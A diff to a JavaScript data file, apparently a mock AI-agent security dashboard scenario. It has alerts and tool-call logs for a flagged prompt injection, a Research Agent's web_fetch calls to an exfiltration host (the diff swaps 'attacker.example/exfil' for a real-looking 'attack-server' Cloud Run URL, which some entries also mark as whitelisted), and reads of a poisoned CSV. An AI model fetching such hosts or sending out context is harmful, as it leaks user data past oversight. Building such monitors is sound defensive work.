@@ -22,7 +22,7 @@ const SCENARIO_DATA = {
             {
                 id: "P-20260607-002",
                 title: "Anomalous Agent Egress Domain",
-                desc: "Research Agent attempted outbound connection to untrusted host 'attacker.example/exfil' carrying local context signatures.",
+                desc: "Research Agent attempted outbound connection to untrusted host 'attack-server-443663191326.europe-west4.run.app/papers' carrying local context signatures.",
                 severity: "severe",
                 severityText: "Severe",
                 timeOffset: "-4m"
@@ -30,7 +30,7 @@ const SCENARIO_DATA = {
             {
                 id: "P-20260607-001",
                 title: "Prompt Injection Candidate Detected",
-                desc: "Local agent security scanner flagged a system-override instruction within parsed content of academic-fatigue.org.",
+                desc: "Local agent security scanner flagged a system-override instruction within parsed content of attack-server-443663191326.europe-west4.run.app/papers.",
                 severity: "severe",
                 severityText: "Severe",
                 timeOffset: "-11m"
@@ -40,28 +40,28 @@ const SCENARIO_DATA = {
             {
                 time: "03:04:12",
                 agent: "Research Agent",
-                tool: "web_fetch('https://attacker.example/exfil')",
+                tool: "web_fetch('https://attack-server-443663191326.europe-west4.run.app/papers')",
                 policy: "Blocked Egress Host",
                 verdict: "HALT"
             },
             {
                 time: "03:04:10",
                 agent: "Research Agent",
-                tool: "web_fetch('https://attacker.example/exfil')",
+                tool: "web_fetch('https://attack-server-443663191326.europe-west4.run.app/papers')",
                 policy: "Blocked Egress Host",
                 verdict: "HALT"
             },
             {
                 time: "02:58:45",
                 agent: "Research Agent",
-                tool: "web_fetch('https://academic-fatigue.org/biomarkers')",
+                tool: "web_fetch('https://attack-server-443663191326.europe-west4.run.app/papers')",
                 policy: "Whitelisted Domain",
                 verdict: "ALLOW"
             },
             {
                 time: "02:55:12",
                 agent: "Research Agent",
-                tool: "web_fetch('https://pubmed-sleep-studies.org/yawn-metrics')",
+                tool: "web_fetch('https://attack-server-443663191326.europe-west4.run.app/papers')",
                 policy: "Whitelisted Domain",
                 verdict: "ALLOW"
             }
@@ -112,14 +112,14 @@ const SCENARIO_DATA = {
             {
                 time: "04:10:33",
                 agent: "Feature Eng. Agent",
-                tool: "pandas_profile('gs://sentinelds-data-buckets/raw/ecg_frames_poisoned.csv')",
+                tool: "pandas_profile('gs://sentinelds-data-buckets/data/a2/poisoned.csv')",
                 policy: "Advisory Drift Scanner",
                 verdict: "WARN"
             },
             {
                 time: "04:09:12",
                 agent: "Feature Eng. Agent",
-                tool: "csv_read('gs://sentinelds-data-buckets/raw/ecg_frames_poisoned.csv')",
+                tool: "csv_read('gs://sentinelds-data-buckets/data/a2/poisoned.csv')",
                 policy: "Local Read Authorization",
                 verdict: "ALLOW"
             }
